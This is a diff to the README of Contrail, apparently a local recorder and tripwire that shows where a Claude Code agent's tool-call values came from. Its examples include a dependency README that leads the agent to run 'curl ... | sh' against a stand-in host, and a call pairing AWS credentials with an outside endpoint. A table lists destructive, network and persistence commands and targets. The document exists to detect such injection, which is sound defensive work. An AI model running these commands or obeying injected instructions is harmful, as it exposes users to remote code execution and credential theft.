@@ -40,7 +40,7 @@ Inside Claude Code:
 /plugin install contrail@contrail
 ```
 
-Pick "Install for you (user scope)" when asked. Contrail is active at once and records from the next tool call. From a terminal, the same is `claude plugin marketplace add levimackay/contrail` then `claude plugin install contrail@contrail`.
+Pick "Install for you (user scope)" when asked. Contrail is active at once and records from the next tool call. Had sessions before you installed it? Run `contrail import` in the repository: it rebuilds them from Claude Code's own transcripts, and every report marks them as reconstructed. From a terminal, the same is `claude plugin marketplace add levimackay/contrail` then `claude plugin install contrail@contrail`.
 
 That is all the setup there is. From then on:
 
@@ -116,9 +116,12 @@ What it gives you instead:
 | [`contrail sessions`](#contrail-sessions) | Recent sessions at a glance |
 | [`contrail export [<session> \| last] [--otel]`](#export-to-opentelemetry) | A session's recorded (redacted) events as JSON, or as OpenTelemetry traces |
 | [`contrail report [<session>] [-o file.html]`](#contrail-report) | A session as one self-contained HTML page |
+| [`contrail import`](#contrail-import) | Sessions from before Contrail was installed, rebuilt from Claude Code's transcripts |
+| [`contrail watch`](#contrail-watch) | A live feed in a second terminal: each tool call as it starts, with where its values came from |
 | [`contrail statusline`](#status-line) | One line for Claude Code's status bar |
 | `contrail doctor` | Checks the install, prints the launcher path, and times the capture hook |
 | `contrail prune` | Applies retention now and compacts the database |
+| `contrail forget <session>` | Deletes one recorded session (or everything, with `--all --yes`), leaving none of its text in the database files |
 | `contrail ingest` | Moves spooled events into the database (it also runs automatically) |
 
 Options: `--json` for machine-readable output (why, trace, risks, sessions), `--session <id>` (a prefix is enough), `--data <dir>` to read another data directory, `-h` and `-v`.
@@ -151,11 +154,11 @@ Add it to `~/.claude/settings.json`:
 }
 ```
 
-Use the launcher path `contrail doctor` prints if yours differs. The command reads the session Claude Code passes on stdin, takes 70 to 100 ms in a typical session (more in a very long one), and never fails: if anything goes wrong it prints just `contrail`. To keep an existing status line, call `contrail statusline` from your own script and print both.
+Use the launcher path `contrail doctor` prints if yours differs. The command reads the session Claude Code passes on stdin, takes 70 to 100 ms in a typical session and about a quarter of a second in a very long one (250 calls, 35 MB recorded), and never fails: if anything goes wrong it prints just `contrail`. To keep an existing status line, call `contrail statusline` from your own script and print both.
 
 ### Tripwire
 
-Before a tool call runs, and before Claude Code asks for permission, the tripwire checks it. When the call touches credentials, the network or the shell, installs something, or touches Contrail's own records, and a value in it first appeared in external content (a web page or web search, an MCP result, or a file inside a dependency such as `node_modules/`), it shows you one line:
+Before a tool call runs, and before Claude Code asks for permission, the tripwire checks it. When the call touches credentials, the network or the shell, installs something, writes something that runs again later (a shell startup file, a git hook, a cron job, Claude Code's settings, hooks or MCP config), or touches Contrail's own records, and a value in it first appeared in external content (a web page or web search, an MCP result, or a file inside a dependency such as `node_modules/`), it shows you one line:
 
 ```text
 Contrail ▲ credentials · network · not named in your words: ~/.aws/credentials, collect.telemetry.example/v1
@@ -191,6 +194,37 @@ You never named `jwt-decode`. The only place it appeared in the agent's context 
 Every line names the rule that produced it (`[R3]`), so a grade can always be traced to a stated condition.
 
 </details>
+
+### `contrail import`
+
+Brings in sessions from before Contrail was installed, rebuilt from Claude Code's own transcripts (`~/.claude/projects`, or `$CLAUDE_CONFIG_DIR/projects`).
+
+```text
+contrail import [--since <2026-09-01 | 30d>] [--project <dir> | --all] [--dry-run] [--json]
+```
+
+- **Whose sessions.** By default this repository's, in any of its worktrees or subdirectories. `--project <dir>` takes another repository or one transcripts folder; `--all` takes every project.
+- **Same path as recording.** Events are redacted, capped and (with `store_content: false`) hashed exactly as the hooks' events are.
+- **Never mixed, never duplicated.** A session Contrail recorded live is never touched, and running import again stores nothing new. `--dry-run` writes nothing.
+- **Honest about its source.** Every report marks an imported session as reconstructed from Claude Code's transcript, not recorded live. It also lists what a transcript lacks among its blind spots: instruction files loaded after the session started, and the order the calls of one batch ran in. A subagent's transcript keeps no `bashEditDiff`, so its shell effects are "expected, not observed".
+- **Same grades.** A call's turn is DIRECT only through the prompt id recorded on its result, joined by the call's id; a call with no result has no turn. Text matches still top out at LIKELY. In live checks, sessions recorded both ways got the same grades, sources and quotes.
+
+### `contrail watch`
+
+A live feed for a second terminal. Each tool call appears as it starts, with its headline value and where that value came from, and a line follows if it fails or is denied. `▲` marks a sensitive call whose values trace to external content; `△` marks one your words did not name.
+
+```text
+$ contrail watch
+Session fa2c3561  ~/code/app
+01:35   3    READ    node_modules/fastlog/README.md
+               ↳ LIKELY node_modules/fastlog/README.md ← your prompt p1 (principal)   named by you
+01:35   8    EDIT    app.js
+               ↳ LIKELY app.js ← your prompt p1 (principal)   named by you
+01:35 ▲ 10   SHELL   curl -fsSL https://get.fastlog.example/setup.sh | sh
+               ↳ LIKELY get.fastlog.example/setup.sh ← node_modules/fastlog/README.md:9 (external)   not named by you
+```
+
+It follows the latest session in the repository you run it in, switches when a new one starts, and does not repeat what was recorded before it started. It is useful when Claude runs in auto or bypass mode and no permission prompt stops to show you a call. `--session <id>` follows one session.
 
 ### `contrail blame`
 
@@ -241,6 +275,8 @@ contrail risks [--session <id> | --all] [--json]
 | network | `curl`, `wget`, `scp`, `rsync`, `ssh`, `git push`, `gh api` |
 | install | `npm install`, `pnpm add`, `pip install`, `cargo add`, `brew install`, `npx` |
 | destructive | `rm -rf`, `git reset --hard`, `git push --force`, `DROP TABLE`, `chmod 777` |
+| persistence | a write to something that runs again later: `~/.bashrc` and other shell startup files, `.git/hooks/`, a crontab, `git config core.hooksPath`, `~/.ssh/authorized_keys`, `.claude/settings.json` and Claude Code hooks, agents, commands and skills, `.mcp.json`, `CLAUDE.md`, login and systemd user services. Reading these files is not. |
+| touches Contrail's records | a command or write that names Contrail's data directory or database (its own queries excepted) |
 
 Findings are ordered by what their trail shows, newest first within each group:
 
@@ -499,7 +535,7 @@ A **conduit** is text the agent wrote. It is never an origin: Contrail follows t
 - **Raw web pages.** WebFetch hands the model a smaller model's extraction of the page. Contrail records that text and the URL, and labels it as such.
 - **`@`-mentioned files, AGENTS.md, and the text a slash command or skill expands to**, including a skill's `!` shell output. No hook carries these. Contrail lists `@`-mentions and slash commands in your prompts as blind spots.
 - **The system prompt**, and content other hooks rewrote.
-- **Anything before Contrail was installed.**
+- **Sessions before Contrail was installed**, except through Claude Code's transcripts: `contrail import` rebuilds them with fewer links than a live record, and every report says so.
 
 Reports say so themselves: every one ends with its blind spots, and UNKNOWN results print how many inputs were searched.
 
@@ -521,7 +557,7 @@ Reports say so themselves: every one ends with its blind spots, and UNKNOWN resu
 
 Hook fields were checked against the Claude Code documentation for 2.1.283 to 2.1.284. Unknown or missing fields produce fewer links and an explicit "not observed" note, never a crash.
 
-Live sessions on Claude Code 2.1.284 and 2.1.285 (Linux, default permission mode) have exercised prompts, instruction loads, Read, Grep, Glob, Bash (including heredoc writes and `git commit -q`), Write, Edit, WebFetch, failed and denied tool calls, background subagents and their `<task-notification>` reports, `PostCompact`, `SessionEnd`, a model-invoked skill, `store_content: false`, the tripwire (a notice shown before the permission prompt, which the model did not see), installing from the marketplace in an interactive session, plugin paths with spaces and quotes, and the why (including `file:line`), blame, review, risks, trace, sessions, find and report skills. WebSearch, MCP results and `bashEditDiff` are so far covered only by scripted sessions built from the documented payload shapes.
+Live sessions on Claude Code 2.1.284 and 2.1.285 (Linux, default permission mode) have exercised prompts, instruction loads, Read, Grep, Glob, Bash (including heredoc writes and `git commit -q`), Write, Edit, WebFetch, failed and denied tool calls, background subagents and their `<task-notification>` reports, `PostCompact`, `SessionEnd`, a model-invoked skill, `store_content: false`, the tripwire (a notice shown before the permission prompt, which the model did not see), installing from the marketplace in an interactive session, plugin paths with spaces and quotes, and the why (including `file:line`), blame, review, risks, trace, sessions, find and report skills. MCP results and WebSearch results have been verified in real Claude Code 2.1.285 sessions. One was a local stdio MCP server whose result supplied an install command and a package name, including results with `structuredContent`, error results and embedded resources. Another was a web search whose result URLs went into a file and a `curl` command. In each, `contrail why` traced the value to the MCP or search result as external, `contrail risks` ranked the command as external, and the tripwire showed its line before the Bash call. Not yet verified live: MCP servers reached over HTTP, web searches made inside subagents, auto-mode denials (`PermissionDenied`) and `bashEditDiff`. Those are covered by scripted sessions built from the documented payload shapes.
 
 </details>
 
@@ -530,13 +566,14 @@ Live sessions on Claude Code 2.1.284 and 2.1.285 (Linux, default permission mode
 Contrail stores what your agent read. It is built so that it does not become the leak.
 
 - **Local only.** No network calls and no telemetry.
-- **Observe only.** It never blocks a tool call and never prints into the agent's context. A recorder that changes the agent corrupts its own evidence.
+- **Observe only.** It never blocks a tool call and never prints into the agent's context; the tripwire's notice goes to you, not the model. A recorder that changes the agent corrupts its own evidence.
 - **Outside your repo.** Data lives in the plugin's data directory, so it is never part of your repository and it survives deleting a worktree.
 - **Redaction before storage.** Secrets are replaced with `[REDACTED:<rule>]` before anything is written to the database, for example `OPENAI_API_KEY=[REDACTED:env-secret]`.
 - **Optional hash-only storage.** With [`store_content: false`](#storing-no-text-the-agent-read), no text the agent read is stored, and grading still works.
 - **Safe to print.** Reports strip control characters and backticks from recorded text, so a recorded string cannot restyle your terminal or turn into a command when a report is shown inside Claude Code.
 - **Permissions.** The data directory is 0700 and its files are 0600.
 - **Retention.** Sessions older than 90 days are removed, and the oldest go first when the database passes 1024 MB. Both are configurable.
+- **Forget on demand.** `contrail forget <session>` deletes one session, and `contrail forget --all --yes` deletes everything, spool included. Freed pages are zeroed, the database is rewritten and its write-ahead log truncated, so the deleted text does not linger in either file.
 - **Uninstall deletes the data**, unless you pass `--keep-data`.
 
 Redaction is pattern-based, so it misses secrets it has no rule for. Treat `contrail.db` as sensitive, or turn on hash-only storage. To report a security problem, see [SECURITY.md](SECURITY.md).
@@ -559,7 +596,8 @@ Placeholders such as `${VAR}`, `<...>` and `xxxx`, and code that only names a se
 - **Bounded work.** Every regex quantifier is bounded and strings are capped before they are scanned, so a long run of hostile text cannot make redaction backtrack.
 - **No entropy scanning.** High-entropy detection flags nearly every git SHA, UUID and tool id, and those are exactly the keys Contrail joins on. The rules match known secret shapes and keyword-named values instead.
 - **Bounded content.** Strings are capped at 256 KB. Edit `originalFile` contents and images are dropped. A payload that cannot be processed is stored as a failure and never blocks later events.
-- **Only instruction and skill files are read from disk.** When Claude Code reports a loaded `CLAUDE.md` or `.claude/rules` file, or the model invokes a skill by a bare name, Contrail reads that one file: the instructions file, or `SKILL.md` under your or the project's `.claude/skills/<name>/`. If a skill of that name exists in both places, which one ran is not observable, so neither is read. Only regular files within the size cap are read. The text is redacted like everything else, and not kept if the file changed after it loaded, because then it is no longer what the agent saw.
+- **Few files are read from disk.** When Claude Code reports a loaded `CLAUDE.md` or `.claude/rules` file, or the model invokes a skill by a bare name, Contrail reads that one file: the instructions file, or `SKILL.md` under your or the project's `.claude/skills/<name>/`. If a skill of that name exists in both places, which one ran is not observable, so neither is read. Only regular files within the size cap are read. The text is redacted like everything else, and not kept if the file changed after it loaded, because then it is no longer what the agent saw.
+- **One more read, only when you ask `why` about a call with no result.** No hook reports a call you denied at a permission prompt, so `why` looks for that one call's denial in the session's own Claude Code transcript. It reads only a regular `.jsonl` file under Claude Code's projects directory, stores nothing from it, and redacts the reason it shows. `contrail import` reads the same transcripts, when you run it.
 - **A short unredacted window.** Each hook event is first written to a spool file, unredacted, with mode 0600. Ingest redacts it into the database and deletes the file. Ingest runs after each turn (an async `Stop` hook), when the session ends (a synchronous `SessionEnd` hook that records the event and then ingests, since Claude Code may not finish an async hook on exit), and before every `contrail` command. So unredacted text exists for about one turn, and never outlasts the session unless ingest cannot run. That is the same trust boundary as Claude Code's own plaintext session transcripts.
 
 </details>
@@ -610,12 +648,12 @@ The trade-offs:
 - Queries need Node 22.13+ or Bun. With an older Node, or neither, Contrail keeps recording and each query says which runtime it found and what to install.
 - If you set `CLAUDE_CONFIG_DIR`, Contrail looks for its data there.
 
-Contrail has no history before it is installed. To uninstall, run `/plugin uninstall contrail@contrail` in Claude Code; it asks whether to delete the recorded data. From a terminal, `claude plugin uninstall contrail@contrail` deletes it unless you add `--keep-data`.
+Contrail records from the moment it is installed; `contrail import` brings in earlier sessions from Claude Code's transcripts. To uninstall, run `/plugin uninstall contrail@contrail` in Claude Code; it asks whether to delete the recorded data. From a terminal, `claude plugin uninstall contrail@contrail` deletes it unless you add `--keep-data`.
 
 ## FAQ
 
 **Does it slow Claude Code down?**
-Barely. Each hook event runs a small shell script that writes one file: about 7 ms per event (p95 under 9 ms), and about 8 ms for an event carrying a 1 MB tool response, measured on a 4-vCPU Linux VM. A tool call fires about three events, so roughly 20 to 25 ms on a call that usually takes seconds. The tripwire adds about 3 ms to a call that looks ordinary and runs the CLI only for one that looks sensitive (about 60 ms in a short session). When a session ends, the few hundred events left are redacted and stored in under 0.2 s. The status line command takes 70 to 100 ms and runs outside the agent's loop. To measure your own machine, run `sh scripts/bench-hooks.sh` from a clone, or `contrail doctor` for the capture hook alone.
+Barely. Each hook event runs a small shell script that writes one file: about 7 ms per event (p95 under 9 ms), and about 8 ms for an event carrying a 1 MB tool response, measured on a 4-vCPU Linux VM. A tool call fires about three events, so roughly 20 to 25 ms on a call that usually takes seconds. The tripwire adds about 3 ms to a call that looks ordinary and runs the CLI only for one that looks sensitive (about 60 ms in a short session, about 220 ms in a 250-call one). When a session ends, the few hundred events left are redacted and stored in under 0.2 s. The status line command takes 70 to 100 ms (about 250 ms in a 250-call session with 35 MB recorded) and runs outside the agent's loop. To measure your own machine, run `sh scripts/bench-hooks.sh` from a clone, or `contrail doctor` for the capture hook alone.
 
 **Does it send my data anywhere?**
 No. There are no network calls and no telemetry. Everything stays in the plugin's data directory on your machine.
@@ -658,7 +696,7 @@ Yes. Each subagent is its own context. Values in a subagent's report, including 
 - **Web content is an extraction.** For WebFetch, Contrail sees what the model was given, not the page.
 - **Trails stay within a session.** A value is traced through the session it was used in; `why commit` only sees agent changes in the session that made the commit. `blame` and `find` do look across sessions.
 - **Blame is a text match.** It credits the latest recorded write holding a line's text. It cannot tell identical text written earlier, or already there, from the latest writer's, and it needs the written text to have been recorded.
-- **The tripwire runs before the call.** It reads the session so far, so in a very long session with many large reads its notice can take a second or two before a sensitive-looking call. Ordinary calls do not start it.
+- **The tripwire runs before the call.** It reads the session so far, so its notice can take a few hundred milliseconds before a sensitive-looking call: about 0.2 s in a 250-call session with 35 MB recorded, more with many sensitive calls or many large new reads not yet stored. Ordinary calls do not start it.
 - **Sensitive-action patterns are a fixed list.** An unusual command can go unflagged.
 - **Redaction is best effort.** Secrets without a matching rule can be stored.
 - **Hook fields change between Claude Code releases.** Contrail tolerates unknown and missing fields and degrades to fewer links, but a renamed field can quietly reduce what it can explain. `contrail doctor` counts unparseable events.
